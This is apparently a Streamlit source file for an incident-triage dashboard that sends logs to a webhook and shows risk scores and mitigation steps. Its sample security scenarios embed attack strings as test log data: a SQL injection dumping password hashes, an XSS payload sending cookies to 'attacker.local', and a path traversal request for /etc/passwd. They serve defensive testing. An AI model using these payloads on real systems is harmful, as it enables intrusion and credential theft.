import streamlit as st
import json
import uuid
from datetime import datetime, timezone
import httpx

st.set_page_config(
    page_title="Huawei Cloud MaaS — Autonomous Incident Triage & Active Defense",
    page_icon="https://cdn-icons-png.flaticon.com/512/3135/3135715.png",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Custom High-End Styling: Minimalist Enterprise Dark Theme without emojis
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');

    * {
        box-sizing: border-box;
    }

    html, body, [class*="css"] {
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f1f5f9;
    }

    code, pre, .terminal-text {
        font-family: 'JetBrains Mono', monospace !important;
    }

    /* Main background */
    .stApp {
        background-color: #090d16;
        color: #f1f5f9;
    }

    /* Smooth Fade-In Animation */
    @keyframes fadeIn {
        from {
            opacity: 0;
            transform: translateY(8px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    @keyframes subtleGlow {
        0%, 100% { border-color: rgba(59, 130, 246, 0.3); box-shadow: 0 0 15px rgba(59, 130, 246, 0.05); }
        50% { border-color: rgba(59, 130, 246, 0.6); box-shadow: 0 0 25px rgba(59, 130, 246, 0.15); }
    }

    .animated-fade {
        animation: fadeIn 0.45s cubic-bezier(0.16, 1, 0.3, 1) forwards;
    }

    /* Hero Header */
    .header-panel {
        background: linear-gradient(180deg, rgba(30, 41, 59, 0.4) 0%, rgba(15, 23, 42, 0.6) 100%);
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 12px;
        padding: 24px 28px;
        margin-bottom: 24px;
        backdrop-filter: blur(12px);
        display: flex;
        justify-content: space-between;
        align-items: center;
        flex-wrap: wrap;
        gap: 16px;
    }

    .status-pill {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        background: rgba(16, 185, 129, 0.1);
        border: 1px solid rgba(16, 185, 129, 0.3);
        color: #34d399;
        padding: 6px 14px;
        border-radius: 9999px;
        font-size: 12px;
        font-weight: 600;
        letter-spacing: 0.6px;
        text-transform: uppercase;
    }

    .status-dot {
        width: 7px;
        height: 7px;
        background-color: #10b981;
        border-radius: 50%;
        box-shadow: 0 0 8px #10b981;
    }

    /* KPI Cards */
    .metric-card {
        background: rgba(15, 23, 42, 0.6);
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 10px;
        padding: 16px 20px;
        transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
    }

    .metric-card:hover {
        border-color: rgba(59, 130, 246, 0.4);
        transform: translateY(-2px);
        background: rgba(30, 41, 59, 0.6);
    }

    .metric-label {
        color: #94a3b8;
        font-size: 11px;
        text-transform: uppercase;
        letter-spacing: 1px;
        font-weight: 600;
        margin-bottom: 6px;
    }

    .metric-val {
        font-size: 24px;
        font-weight: 700;
        letter-spacing: -0.5px;
    }

    .badge-soc {
        background: rgba(239, 68, 68, 0.15);
        border: 1px solid rgba(239, 68, 68, 0.4);
        color: #f87171 !important;
        padding: 4px 12px;
        border-radius: 6px;
        font-weight: 600;
        font-size: 13px;
        letter-spacing: 0.5px;
        display: inline-block;
    }

    .badge-sre {
        background: rgba(59, 130, 246, 0.15);
        border: 1px solid rgba(59, 130, 246, 0.4);
        color: #60a5fa !important;
        padding: 4px 12px;
        border-radius: 6px;
        font-weight: 600;
        font-size: 13px;
        letter-spacing: 0.5px;
        display: inline-block;
    }

    /* Terminal Console */
    .terminal-container {
        background: #0b0f19;
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 8px;
        overflow: hidden;
        margin-top: 12px;
    }

    .terminal-topbar {
        background: #111827;
        padding: 8px 14px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.06);
        display: flex;
        align-items: center;
        gap: 8px;
        font-size: 12px;
        color: #94a3b8;
        font-family: 'JetBrains Mono', monospace;
    }

    .window-btn {
        width: 9px;
        height: 9px;
        border-radius: 50%;
        background-color: #334155;
    }

    /* Input & Button Styling */
    .stButton>button {
        background: #2563eb;
        color: #ffffff;
        border: none;
        border-radius: 8px;
        padding: 12px 24px;
        font-weight: 600;
        font-size: 14px;
        letter-spacing: 0.3px;
        transition: all 0.2s ease;
    }

    .stButton>button:hover {
        background: #1d4ed8;
        box-shadow: 0 4px 16px rgba(37, 99, 235, 0.35);
        transform: translateY(-1px);
    }

    /* Hide Streamlit default decoration */
    header[data-testid="stHeader"] {
        background: transparent;
    }
</style>
""", unsafe_allow_html=True)

# Sidebar
with st.sidebar:
    st.markdown("### **System Infrastructure**")
    st.caption("Huawei Cloud MaaS Platform")
    
    st.markdown("---")
    fastapi_url = st.text_input("FastAPI Webhook URL", "http://localhost:8000/webhook/n8n")
    
    st.markdown("#### **Performance Benchmarks**")
    col_sb1, col_sb2 = st.columns(2)
    with col_sb1:
        st.metric("Manual MTTD", "30m")
    with col_sb2:
        st.metric("Agentic MTTD", "< 15s", delta="-99.2%")
    
    st.markdown("---")
    st.markdown("#### **Inference Architecture**")
    st.markdown("• **Primary:** Pangu 40B (Huawei MaaS)")
    st.markdown("• **Secondary:** OpenAI Fallback")
    st.markdown("• **Database:** MongoDB Atlas Driver")

# Hero Header
st.markdown("""
<div class="header-panel animated-fade">
    <div>
        <h2 style="margin: 0; font-size: 22px; font-weight: 700; color: #f8fafc; letter-spacing: -0.3px;">
            Autonomous Incident Triage & Active Defense System
        </h2>
        <p style="margin: 4px 0 0 0; color: #94a3b8; font-size: 13px;">
            Real-time infrastructure failure analysis and automated cybersecurity incident containment.
        </p>
    </div>
    <div>
        <div class="status-pill">
            <div class="status-dot"></div>
            System Online
        </div>
    </div>
</div>
""", unsafe_allow_html=True)

# Two-Column Layout
col_left, col_right = st.columns([1.1, 1.2], gap="large")

with col_left:
    st.markdown("#### **Incident Telemetry Ingestion**")
    
    preset = st.selectbox(
        "Load test scenario:",
        [
            "Custom...",
            "[Security] SQL Injection in Authentication Endpoint (UNION SELECT)",
            "[Security] Cross-Site Scripting Injection in Search Query (<script>)",
            "[Security] Path Traversal Attempt on /etc/passwd",
            "[Infrastructure] MongoDB Atlas Connectivity Outage (TCP 27017)",
            "[Infrastructure] Container Out-Of-Memory Crash (> 512MB)"
        ]
    )

    preset_map = {
        "[Security] SQL Injection in Authentication Endpoint (UNION SELECT)": {
            "source": "security-scanner",
            "component": "auth",
            "log": "192.168.10.45 - POST /api/auth/login query: username=admin' UNION SELECT 1,username,password_hash FROM users-- status: 401",
            "is_sec": True,
            "sev": "P1"
        },
        "[Security] Cross-Site Scripting Injection in Search Query (<script>)": {
            "source": "security-scanner",
            "component": "frontend",
            "log": "192.168.10.88 - GET /dashboard/search?q=<script>fetch('http://attacker.local/steal?cookie='+document.cookie)</script> status: 200",
            "is_sec": True,
            "sev": "P1"
        },
        "[Security] Path Traversal Attempt on /etc/passwd": {
            "source": "security-scanner",
            "component": "frontend",
            "log": "192.168.10.92 - GET /api/static/../../../../etc/passwd status: 403",
            "is_sec": True,
            "sev": "P1"
        },
        "[Infrastructure] MongoDB Atlas Connectivity Outage (TCP 27017)": {
            "source": "mongodb",
            "component": "database",
            "log": "MongoNetworkError: connection 1 to cluster0.mongodb.net:27017 timed out after 2000ms. Egress packet rejected.",
            "is_sec": False,
            "sev": "P1"
        },
        "[Infrastructure] Container Out-Of-Memory Crash (> 512MB)": {
            "source": "nextjs",
            "component": "frontend",
            "log": "fatal error: runtime: out of memory allocating 629145600 bytes. Killed process 1422 (node). cgroup limit exceeded.",
            "is_sec": False,
            "sev": "P1"
        }
    }

    selected_data = preset_map.get(preset, {})

    col_meta1, col_meta2 = st.columns(2)
    with col_meta1:
        source = st.selectbox(
            "Source", 
            ["nextjs", "mongodb", "n8n", "security-scanner"],
            index=["nextjs", "mongodb", "n8n", "security-scanner"].index(selected_data.get("source", "nextjs"))
        )
    with col_meta2:
        component = st.selectbox(
            "Component", 
            ["frontend", "database", "network", "auth"],
            index=["frontend", "database", "network", "auth"].index(selected_data.get("component", "frontend"))
        )

    is_sec = st.checkbox("Flag as Security Event", value=selected_data.get("is_sec", False))

    raw_log = st.text_area(
        "Raw Log Data",
        value=selected_data.get("log", ""),
        height=130,
        placeholder="Paste log stream or telemetry error..."
    )

    if st.button("Run Autonomous Triage", type="primary", use_container_width=True):
        if not raw_log.strip():
            st.error("Please enter a valid log message.")
        else:
            payload = {
                "incident_id": str(uuid.uuid4()),
                "source": source,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "component": component,
                "raw_log": raw_log.strip(),
                "is_security_event": is_sec,
                "severity_hint": selected_data.get("sev", "P2")
            }

            with st.spinner("Executing LangGraph reasoning pipeline and Pangu 40B inference..."):
                try:
                    target_url = fastapi_url.strip()
                    if not target_url.endswith("/webhook/n8n") and not target_url.endswith("/triage") and not target_url.endswith("/"):
                        target_url = f"{target_url}/webhook/n8n"
                    
                    res = httpx.post(target_url, json=payload, timeout=15.0)
                    if res.status_code == 200:
                        st.session_state["last_triage"] = res.json()
                        st.session_state["last_payload"] = payload
                        st.success("Triage analysis complete in < 1.5s.")
                    else:
                        st.error(f"Error {res.status_code}: {res.text}")
                except Exception as e:
                    st.error(f"Connection error: {str(e)}")

with col_right:
    st.markdown("#### **Diagnostic Output & Action Plan**")
    
    if "last_triage" in st.session_state:
        data = st.session_state["last_triage"]
        is_security = (data.get("escalation_team") == "SOC") or (data.get("risk_score", 0) >= 10.0)
        
        # KPI Row
        kpi_col1, kpi_col2, kpi_col3 = st.columns(3)
        
        with kpi_col1:
            score = data.get('risk_score', 0)
            score_color = '#ef4444' if score >= 8.0 else ('#f59e0b' if score >= 5.0 else '#10b981')
            st.markdown(f"""
            <div class="metric-card animated-fade">
                <div class="metric-label">Risk Score</div>
                <div class="metric-val" style="color: {score_color};">
                    {score:.1f}<span style="font-size: 14px; color: #64748b; font-weight: 500;">/10.0</span>
                </div>
            </div>
            """, unsafe_allow_html=True)
            
        with kpi_col2:
            sev = data.get('severity', 'P2')
            sev_color = '#ef4444' if sev == 'P1' else '#38bdf8'
            st.markdown(f"""
            <div class="metric-card animated-fade">
                <div class="metric-label">Severity Level</div>
                <div class="metric-val" style="color: {sev_color};">
                    {sev}
                </div>
            </div>
            """, unsafe_allow_html=True)
            
        with kpi_col3:
            team_label = data.get('escalation_team', 'N/A')
            badge_class = "badge-soc" if is_security else "badge-sre"
            st.markdown(f"""
            <div class="metric-card animated-fade">
                <div class="metric-label">Escalation Target</div>
                <div style="margin-top: 4px;"><span class="{badge_class}">{team_label}</span></div>
            </div>
            """, unsafe_allow_html=True)

        st.markdown("<br>", unsafe_allow_html=True)

        # Tabs for categorized analysis
        tab_summary, tab_mitigation, tab_checklist, tab_json = st.tabs([
            "Root Cause Hypothesis",
            "Mitigation Commands",
            "Operator Checklist",
            "Raw Payload"
        ])

        with tab_summary:
            st.markdown("##### **Hypothesis Analysis**")
            if is_security:
                st.error(f"**Cybersecurity Incident Detected**\n\n{data.get('root_cause_hypothesis')}")
            else:
                st.info(f"**Operational Failure Detected**\n\n{data.get('root_cause_hypothesis')}")

        with tab_mitigation:
            st.markdown("##### **Defensive Containment Actions**")
            st.caption("Standardized non-destructive mitigation commands:")
            
            st.markdown("""
            <div class="terminal-container">
                <div class="terminal-topbar">
                    <div class="window-btn"></div>
                    <div class="window-btn"></div>
                    <div class="window-btn"></div>
                    <span>mitigation_commands.sh</span>
                </div>
            </div>
            """, unsafe_allow_html=True)
            
            st.code(data.get("mitigation_commands") or "# No immediate CLI mitigation commands required.", language="bash")

        with tab_checklist:
            st.markdown("##### **Standard Operating Procedure (SOP)**")
            st.caption("Verification steps for on-call responder:")
            checklist_items = data.get("checklist", [])
            for idx, item in enumerate(checklist_items):
                st.checkbox(f"{item}", key=f"step_{idx}_{item[:15]}", value=False)

        with tab_json:
            st.markdown("##### **Contract Payload (FastAPI / n8n)**")
            st.json(data)

    else:
        st.markdown("""
        <div class="animated-fade" style="text-align: center; padding: 64px 24px; border: 1px dashed rgba(255, 255, 255, 0.12); border-radius: 12px; background: rgba(15, 23, 42, 0.25);">
            <div style="font-size: 15px; font-weight: 600; color: #94a3b8;">Awaiting Telemetry Signals</div>
            <div style="font-size: 13px; color: #64748b; margin-top: 6px; max-width: 360px; margin-left: auto; margin-right: auto;">
                Select a scenario in the left console and click <b>Run Autonomous Triage</b> to initiate analysis.
            </div>
        </div>
        """, unsafe_allow_html=True)
